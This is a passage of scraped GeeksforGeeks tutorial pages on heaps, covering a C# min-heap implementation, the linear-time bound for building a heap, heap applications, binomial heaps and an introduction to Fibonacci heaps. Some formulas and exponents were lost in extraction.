Parent(i); } return true; } // Decreases value of given key to new_val. // It is assumed that new_val is smaller // than heapArray[key]. public void decreaseKey(int key, int new_val) { heapArray[key] = new_val; while (key != 0 && heapArray[key] < heapArray[Parent(key)]) { Swap(ref heapArray[key], ref heapArray[Parent(key)]); key = Parent(key); } } // Returns the minimum key (key at // root) from min heap public int getMin() { return heapArray[0]; } // Method to remove minimum element // (or root) from min heap public int extractMin() { if (current_heap_size <= 0) { return int.MaxValue; } if (current_heap_size == 1) { current_heap_size--; return heapArray[0]; } // Store the minimum value, // and remove it from heap int root = heapArray[0]; heapArray[0] = heapArray[current_heap_size - 1]; current_heap_size--; MinHeapify(0); return root; } // This function deletes key at the // given index. It first reduced value // to minus infinite, then calls extractMin() public void deleteKey(int key) { decreaseKey(key, int.MinValue); extractMin(); } // A recursive method to heapify a subtree // with the root at given index // This method assumes that the subtrees // are already heapified public void MinHeapify(int key) { int l = Left(key); int r = Right(key); int smallest = key; if (l < current_heap_size && heapArray[l] < heapArray[smallest]) { smallest = l; } if (r < current_heap_size && heapArray[r] < heapArray[smallest]) { smallest = r; } if (smallest != key) { Swap(ref heapArray[key], ref heapArray[smallest]); MinHeapify(smallest); } } // Increases value of given key to new_val. // It is assumed that new_val is greater // than heapArray[key]. // Heapify from the given key public void increaseKey(int key, int new_val) { heapArray[key] = new_val; MinHeapify(key); } // Changes value on a key public void changeValueOnAKey(int key, int new_val) { if (heapArray[key] == new_val) { return; } if (heapArray[key] < new_val) { increaseKey(key, new_val); } else { decreaseKey(key, new_val); } } } static class MinHeapTest{ // Driver code public static void Main(string[] args) { MinHeap h = new MinHeap(11); h.insertKey(3); h.insertKey(2); h.deleteKey(1); h.insertKey(15); h.insertKey(5); h.insertKey(4); h.insertKey(45); Console.Write(h.extractMin() + " "); Console.Write(h.getMin() + " "); h.decreaseKey(2, 1); Console.Write(h.getMin()); } } // This code is contributed by // Dinesh Clinton Albert(dineshclinton) chevron_right filter_none Output: 2 4 1 Coding Practice on Heap All Articles on Heap Quiz on Heap PriorityQueue : Binary Heap Implementation in Java Library Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapTournament Tree (Winner Tree) and Binary HeapWhy is Binary Heap Preferred over BST for Priority Queue?Check if a given Binary Tree is HeapArray Representation Of Binary HeapGiven level order traversal of a Binary Tree, check if the Tree is a Min-HeapLeaf starting point in a Binary Heap data structureHeight of a complete binary tree (or Heap) with N nodesComplexity analysis of various operations of Binary Min HeapPrint all the leaf nodes of Binary HeapPriority Queue using Binary HeapHow to check if a given array represents a Binary Heap?Overview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash)Applications of Heap Data StructureTime Complexity of building a heapFibonacci Heap | Set 1 (Introduction)K-ary HeapImproved By : dineshclinton Article Tags : Heap Practice Tags : Heap thumb_up 122 To-do Done 3 Based on 223 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Print all elements in sorted order from row and column wise sorted matrix Next last_page Binomial Heap Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Heap Building Heap from ArrayInsertion and Deletion in HeapsMax Heap in JavaOverview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash)Real-time application of Data Structures More related articles in Heap Merge k sorted arrays | Set 1Priority Queue using Binary HeapSort a nearly sorted (or K sorted) arrayMedian in a stream of integers (running integers)Priority Queue in Python room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Time Complexity of building a heap - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) Time Complexity of building a heap Last Updated: 18-09-2017 Consider the following algorithm for building a Heap of an input array A. BUILD-HEAP(A) heapsize := size(A); for i := floor(heapsize/2) downto 1 do HEAPIFY(A, i); end for END A quick look over the above algorithm suggests that the running time is , since each call to Heapify costs and Build-Heap makes such calls. This upper bound, though correct, is not asymptotically tight. We can derive a tighter bound by observing that the running time of Heapify depends on the height of the tree ‘h’ (which is equal to lg(n), where n is number of nodes) and the heights of most sub-trees are small. The height ’h’ increases as we move upwards along the tree. Line-3 of Build-Heap runs a loop from the index of the last internal node (heapsize/2) with height=1, to the index of root(1) with height = lg(n). Hence, Heapify takes different time for each node, which is . For finding the Time Complexity of building a heap, we must know the number of nodes having height h. For this we use the fact that, A heap of size n has at most nodes with height h. Now to derive the time complexity, we express the total cost of Build-Heap as- (1) Step 2 uses the properties of the Big-Oh notation to ignore the ceiling function and the constant 2(). Similarly in Step three, the upper limit of the summation can be increased to infinity since we are using Big-Oh notation. Sum of infinite G.P. (x < 1) (2) On differentiating both sides and multiplying by x, we get (3) Putting the result obtained in (3) back in our derivation (1), we get (4) Hence Proved that the Time complexity for Building a Binary Heap is . Reference : http://www.cs.sfu.ca/CourseCentral/307/petra/2009/SLN_2.pdf This article is contributed by Chirag Manwani. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapPython Code for time Complexity plot of Heap SortBuilding Heap from ArrayComplexity analysis of various operations of Binary Min HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)C program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersA Time Complexity QuestionUnderstanding Time Complexity with Simple ExamplesWhat does 'Space Complexity' mean?Complexity of different operations in Binary tree, Binary Search Tree and AVL treeKnowing the complexity in competitive programming Article Tags : AnalysisHeap Practice Tags : Heap thumb_up 77 To-do Done 2.9 Based on 141 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Tournament Tree (Winner Tree) and Binary Heap Next last_page What does ‘Space Complexity’ mean? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in Heap Huffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Arrayk largest(or smallest) elements in an array | added Min Heap methodMax Heap in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Applications of Heap Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationK'th Smallest/Largest Element in Unsorted Array | Set 1Huffman Coding | Greedy Algo-3k largest(or smallest) elements in an array | added Min Heap method Applications of Heap Data Structure Last Updated: 10-07-2018 Heap Data Structure is generally taught with Heapsort. Heapsort algorithm has limited uses because Quicksort is better in practice. Nevertheless, the Heap data structure itself is enormously used. Following are some uses other than Heapsort. Priority Queues: Priority queues can be efficiently implemented using Binary Heap because it supports insert(), delete() and extractmax(), decreaseKey() operations in O(logn) time. Binomoial Heap and Fibonacci Heap are variations of Binary Heap. These variations perform union also in O(logn) time which is a O(n) operation in Binary Heap. Heap Implemented priority queues are used in Graph algorithms like Prim’s Algorithm and Dijkstra’s algorithm. Order statistics: The Heap data structure can be used to efficiently find the kth smallest (or largest) element in an array. See method 4 and 6 of this post for details. References: http://net.pku.edu.cn/~course/cs101/2007/resource/Intro2Algorithm/book6/chap07.htm http://en.wikipedia.org/wiki/Heap_%28data_structure%29 Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapLeaf starting point in a Binary Heap data structureConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapOverview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash)Design an efficient data structure for given operationsApplications of Priority QueueTournament Tree (Winner Tree) and Binary HeapTime Complexity of building a heapWhy is Binary Heap Preferred over BST for Priority Queue?Fibonacci Heap | Set 1 (Introduction)Check if a given Binary Tree is HeapK-ary HeapHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Implementation of Binomial HeapWhere is Heap Sort used practically?Binary HeapArray Representation Of Binary HeapGiven level order traversal of a Binary Tree, check if the Tree is a Min-Heap Article Tags : Heap Practice Tags : Heap thumb_up 19 To-do Done 2.1 Based on 77 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page k largest(or smallest) elements in an array | added Min Heap method Next last_page Tournament Tree (Winner Tree) and Binary Heap Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Heap Building Heap from ArrayInsertion and Deletion in HeapsMax Heap in JavaOverview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash)Real-time application of Data Structures More related articles in Heap Merge k sorted arrays | Set 1Priority Queue using Binary HeapSort a nearly sorted (or K sorted) arrayMedian in a stream of integers (running integers)Priority Queue in Python room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Binomial Heap - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationAVL Tree | Set 1 (Insertion)LRU Cache ImplementationTrie | (Insert and Search)Red-Black Tree | Set 1 (Introduction)Introduction of B-Tree Binomial Heap Last Updated: 04-11-2020 The main application of Binary Heap is as implement priority queue. Binomial Heap is an extension of Binary Heap that provides faster union or merge operation together with other operations provided by Binary Heap. A Binomial Heap is a collection of Binomial Trees What is a Binomial Tree? A Binomial Tree of order 0 has 1 node. A Binomial Tree of order k can be constructed by taking two binomial trees of order k-1 and making one as leftmost child or other. A Binomial Tree of order k has following properties. a) It has exactly 2k nodes. b) It has depth as k. c) There are exactly kCi nodes at depth i for i = 0, 1, . . . , k. d) The root has degree k and children of root are themselves Binomial Trees with order k-1, k-2,.. 0 from left to right. k = 0 (Single Node) o k = 1 (2 nodes) [We take two k = 0 order Binomial Trees, and make one as child of other] o / o k = 2 (4 nodes) [We take two k = 1 order Binomial Trees, and make one as child of other] o / \ o o / o k = 3 (8 nodes) [We take two k = 2 order Binomial Trees, and make one as child of other] o / | \ o o o / \ | o o o \ o The following diagram is referred from 2nd Edition of CLRS book. Binomial Heap: A Binomial Heap is a set of Binomial Trees where each Binomial Tree follows Min Heap property. And there can be at most one Binomial Tree of any degree. Examples Binomial Heap: 12------------10--------------------20 / \ / | \ 15 50 70 50 40 | / | | 30 80 85 65 | 100 A Binomial Heap with 13 nodes. It is a collection of 3 Binomial Trees of orders 0, 2 and 3 from left to right. 10--------------------20 / \ / | \ 15 50 70 50 40 | / | | 30 80 85 65 | 100 A Binomial Heap with 12 nodes. It is a collection of 2 Binomial Trees of orders 2 and 3 from left to right. Binary Representation of a number and Binomial Heaps A Binomial Heap with n nodes has the number of Binomial Trees equal to the number of set bits in the Binary representation of n. For example let n be 13, there 3 set bits in the binary representation of n (00001101), hence 3 Binomial Trees. We can also relate the degree of these Binomial Trees with positions of set bits. With this relation, we can conclude that there are O(Logn) Binomial Trees in a Binomial Heap with ‘n’ nodes. Operations of Binomial Heap: The main operation in Binomial Heap is union(), all other operations mainly use this operation. The union() operation is to combine two Binomial Heaps into one. Let us first discuss other operations, we will discuss union later. insert(H, k): Inserts a key ‘k’ to Binomial Heap ‘H’. This operation first creates a Binomial Heap with single key ‘k’, then calls union on H and the new Binomial heap. getMin(H): A simple way to getMin() is to traverse the list of root of Binomial Trees and return the minimum key. This implementation requires O(Logn) time. It can be optimized to O(1) by maintaining a pointer to minimum key root. extractMin(H): This operation also uses union(). We first call getMin() to find the minimum key Binomial Tree, then we remove the node and create a new Binomial Heap by connecting all subtrees of the removed minimum node. Finally, we call union() on H and the newly created Binomial Heap. This operation requires O(Logn) time. delete(H): Like Binary Heap, delete operation first reduces the key to minus infinite, then calls extractMin(). decreaseKey(H): decreaseKey() is also similar to Binary Heap. We compare the decreases key with it parent and if parent’s key is more, we swap keys and recur for the parent. We stop when we either reach a node whose parent has a smaller key or we hit the root node. Time complexity of decreaseKey() is O(Logn). Union operation in Binomial Heap: Given two Binomial Heaps H1 and H2, union(H1, H2) creates a single Binomial Heap. The first step is to simply merge the two Heaps in non-decreasing order of degrees. In the following diagram, figure(b) shows the result after merging. After the simple merge, we need to make sure that there is at most one Binomial Tree of any order. To do this, we need to combine Binomial Trees of the same order. We traverse the list of merged roots, we keep track of three-pointers, prev, x and next-x. There can be following 4 cases when we traverse the list of roots. —–Case 1: Orders of x and next-x are not same, we simply move ahead. In following 3 cases orders of x and next-x are same. —–Case 2: If the order of next-next-x is also same, move ahead. —–Case 3: If the key of x is smaller than or equal to the key of next-x, then make next-x as a child of x by linking it with x. —–Case 4: If the key of x is greater, then make x as the child of next. The following diagram is taken from 2nd Edition of CLRS book. How to represent Binomial Heap? A Binomial Heap is a set of Binomial Trees. A Binomial Tree must be represented in a way that allows sequential access to all siblings, starting from the leftmost sibling (We need this in and extractMin() and delete()). The idea is to represent Binomial Trees as the leftmost child and right-sibling representation, i.e., every node stores two pointers, one to the leftmost child and other to the right sibling. Implementation of Binomial Heap Sources: Introduction to Algorithms by Clifford Stein, Thomas H. Cormen, Charles E. Leiserson, Ronald L. This article is contributed by Shivam. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapImplementation of Binomial HeapImplementation of Binomial Heap | Set - 2 (delete() and decreseKey())Memory representation of Binomial HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapApplications of Heap Data StructureTournament Tree (Winner Tree) and Binary HeapTime Complexity of building a heapWhy is Binary Heap Preferred over BST for Priority Queue?Fibonacci Heap | Set 1 (Introduction)Check if a given Binary Tree is HeapK-ary HeapHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Where is Heap Sort used practically?Binary HeapArray Representation Of Binary HeapGiven level order traversal of a Binary Tree, check if the Tree is a Min-HeapHow to implement stack using priority queue or heap?Improved By : sanskar27jain, chandanmahto007, joshirashika100 Article Tags : Advanced Data StructureHeap Practice Tags : Heap thumb_up 21 To-do Done 4.3 Based on 111 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Binary Heap Next last_page Ukkonen’s Suffix Tree Construction – Part 5 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Advanced Data Structure Agents in Artificial IntelligenceAVL Tree | Set 2 (Deletion)Decision Tree Introduction with exampleRed-Black Tree | Set 2 (Insert)Segment Tree | Set 1 (Sum of given range) Most visited in Heap Huffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Arrayk largest(or smallest) elements in an array | added Min Heap methodInsertion and Deletion in Heaps room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Fibonacci Heap | Set 1 (Introduction) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ QuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationMerge SortAVL Tree | Set 1 (Insertion)LRU Cache ImplementationTrie | (Insert and Search)Red-Black Tree | Set 1 (Introduction)Introduction of B-Tree Fibonacci Heap | Set 1 (Introduction) Last Updated: 28-10-2018 Heaps are mainly used for implementing priority queue. We have discussed below heaps in previous posts. Binary Heap Binomial Heap In terms of Time Complexity, Fibonacci Heap beats both Binary and Binomial Heaps. Below are amortized time complexities of Fibonacci Heap. 1) Find Min: Θ(1) [Same as both Binary and Binomial] 2) Delete Min: O(Log n) [Θ(Log n) in both Binary and Binomial] 3) Insert: Θ(1) [Θ(Log n) in Binary and Θ(1) in Binomial] 4) Decrease-Key: Θ(1) [Θ(Log n) in both Binary and Binomial] 5) Merge: Θ(1) [Θ(m Log n) or Θ(m+n) in Binary and Θ(Log n) in Binomial] Like Binomial Heap, Fibonacci Heap is a collection of trees with min-heap or max-heap property. In Fibonacci Heap, trees can can have any shape even all trees can be single nodes (This is unlike Binomial Heap where every tree has to be Binomial Tree). Below is an example Fibonacci Heap taken from here. Fibonacci Heap maintains a pointer to minimum value (which is root of a tree). All tree roots are connected using circular doubly linked list, so all of them can be accessed using single ‘min’ pointer. The main idea is to execute operations in “lazy” way. For example merge operation simply links two heaps, insert operation simply adds a new tree with single node. The operation extract minimum is the most complicated operation. It does delayed work of consolidating trees. This makes delete also complicated as delete first decreases key to minus infinite, then calls extract minimum. Below are some interesting facts about Fibonacci Heap The reduced time complexity of Decrease-Key has importance in Dijkstra and Prim algorithms. With Binary Heap, time complexity of these algorithms is O(VLogV + ELogV). If Fibonacci Heap is used, then time complexity is improved to O(VLogV + E) Although Fibonacci Heap looks promising time complexity wise, it has been found slow in practice as hidden constants are high (Source Wiki). Fibonacci heap are mainly called so because Fibonacci numbers are used in the running time analysis. Also, every node in Fibonacci Heap has degree at most O(log n) and the size of a subtree rooted in a node of degree k is at least Fk+2, where Fk is the kth Fibonacci number. We will soon be discussing Fibonacci Heap operations in detail. This article is contributed by Shivam. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t 